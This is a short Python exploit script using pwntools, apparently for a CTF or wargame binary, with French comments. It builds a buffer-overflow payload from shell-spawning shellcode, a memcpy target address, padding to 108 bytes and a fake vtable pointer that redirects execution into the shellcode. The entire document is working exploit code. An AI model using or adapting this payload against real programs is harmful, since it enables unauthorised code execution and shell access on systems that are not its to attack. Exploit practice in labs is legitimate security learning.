import pwn

shellcode = pwn.asm(pwn.shellcraft.sh()) # je recup le code pour lancer un shell
s_len = len(shellcode) # je prend la len car utile a deux reprise

adress = 0x0804a00c # l'adress qui est envoye dans memcpy
fake_addr = adress + s_len # il s'agit de la fin de mon shellcode en memoire
payload = shellcode # je commence a construire mon payload
payload += pwn.p32(adress) # Adress de mon memcpy en version little endian
payload += b'A' * (108 - len(payload)) # On fill le reste avec des A pour remplir le buffer  
payload += pwn.p32(fake_addr) # on met l'adress de notre fausse v_table
print(payload)
